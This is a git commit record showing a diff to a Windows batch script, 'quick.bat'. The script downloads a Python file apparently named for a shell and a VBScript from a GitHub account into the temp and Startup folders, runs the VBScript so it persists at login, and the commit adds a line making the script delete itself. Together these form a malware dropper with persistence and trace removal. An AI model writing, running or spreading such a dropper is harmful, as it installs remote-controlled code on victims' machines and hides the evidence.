9676414dc4c846b373134293a13919a6c0cc4318
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-04 21:29:27 +0300

    Update quick.bat

--- quick.bat
+++ quick.bat
@@ -4,3 +4,4 @@ curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"
 
 call "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"
+del "%~f0"
